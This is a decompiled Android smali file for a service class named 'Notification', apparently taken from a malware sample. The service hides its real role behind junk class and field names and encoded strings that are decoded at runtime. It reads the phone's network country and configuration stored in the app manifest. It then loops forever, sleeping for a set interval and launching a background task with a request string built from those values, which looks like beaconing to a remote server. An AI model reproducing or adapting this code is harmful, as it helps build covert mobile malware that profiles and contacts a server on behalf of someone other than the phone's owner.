.class public Lcompse/refact/st/upsssss/Notification;
.super Landroid/app/IntentService;


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "NewApi"
    }
.end annotation


# instance fields
.field eryryhrtytujrtujrurt:Landroid/content/Context;

.field private fgjyukukuiki:I

.field public fsafsdfsfsdfsfsdfsd:Ljava/lang/String;

.field hukuiluliulu:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

.field public rthrthrtjrtjrjtdcbcvbc:Ljava/lang/String;

.field public sdfsdfsdfsdf:Ljava/lang/Integer;

.field sdvsdvsvsevsvsev:I

.field serfwefewfwefewef:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

.field private wrrgehehehehe:I

.field public zxcvxvsdvsvsvs:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 3

    const/4 v2, 0x0

    const/16 v0, 0x64

    const-string v1, ";^?I\u0002B\u0018S%B\u0004Q\u001fD\u0013"

    invoke-static {v1}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/i;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v1}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    iput v2, p0, Lcompse/refact/st/upsssss/Notification;->sdvsdvsvsevsvsev:I

    new-instance v1, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    invoke-direct {v1}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;-><init>()V

    iput-object v1, p0, Lcompse/refact/st/upsssss/Notification;->hukuiluliulu:Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;

    new-instance v1, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-direct {v1}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;-><init>()V

    iput-object v1, p0, Lcompse/refact/st/upsssss/Notification;->serfwefewfwefewef:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    iput v0, p0, Lcompse/refact/st/upsssss/Notification;->fgjyukukuiki:I

    iput v2, p0, Lcompse/refact/st/upsssss/Notification;->wrrgehehehehe:I

    return-void
.end method


# virtual methods
.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 9

    const/4 v8, 0x0

    iput-object p0, p0, Lcompse/refact/st/upsssss/Notification;->eryryhrtytujrtujrurt:Landroid/content/Context;

    const-string v0, "\u0017W\u0006I\u0017J\u0013"

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/i;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v0, "<\u001c%"

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    iput-object v7, p0, Lcompse/refact/st/upsssss/Notification;->rthrthrtjrtjrjtdcbcvbc:Ljava/lang/String;

    const-string v0, "\u0006O\u0019I\u0013"

    invoke-static {v0}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/i;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Notification;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkCountryIso()Ljava/lang/String;

    :try_start_0
    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Notification;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Notification;->getPackageName()Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0x80

    invoke-virtual {v0, v1, v2}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    iget-object v0, v0, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    if-eqz v0, :cond_0

    const-string v1, "\u001e\u001c=\u0001\u001a\u000c6\u001d"

    const-string v2, "&R\u0005O\"N\u0002K\u0013"

    const-string v3, "\u001e\u001c=\u0001\u001a\u0000#\u000c"

    invoke-static {v3}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    iput-object v3, p0, Lcompse/refact/st/upsssss/Notification;->sdfsdfsdfsdf:Ljava/lang/Integer;

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/i;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcompse/refact/st/upsssss/Notification;->fsafsdfsfsdfsfsdfsd:Ljava/lang/String;

    invoke-static {v1}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcompse/refact/st/upsssss/Notification;->zxcvxvsdvsvsvs:Ljava/lang/String;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_1

    :cond_0
    :goto_0
    :try_start_1
    sget-object v0, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    iget-object v1, p0, Lcompse/refact/st/upsssss/Notification;->sdfsdfsdfsdf:Ljava/lang/Integer;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v2

    invoke-virtual {v0, v2, v3}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0

    :goto_1
    new-instance v0, Lcompse/refact/st/upsssss/sdvsdvsvsevsvsev;

    iget-object v3, p0, Lcompse/refact/st/upsssss/Notification;->fsafsdfsfsdfsfsdfsd:Ljava/lang/String;

    iget-object v4, p0, Lcompse/refact/st/upsssss/Notification;->zxcvxvsdvsvsvs:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v8, v7}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\u0008\u001fD\u0019IY"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/i;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "`\u0019 \u000e"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    move-object v1, p0

    move-object v2, p0

    invoke-direct/range {v0 .. v6}, Lcompse/refact/st/upsssss/sdvsdvsvsevsvsev;-><init>(Lcompse/refact/st/upsssss/Notification;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    new-array v1, v8, [Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcompse/refact/st/upsssss/sdvsdvsvsevsvsev;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_1

    :catch_1
    move-exception v0

    goto :goto_0
.end method
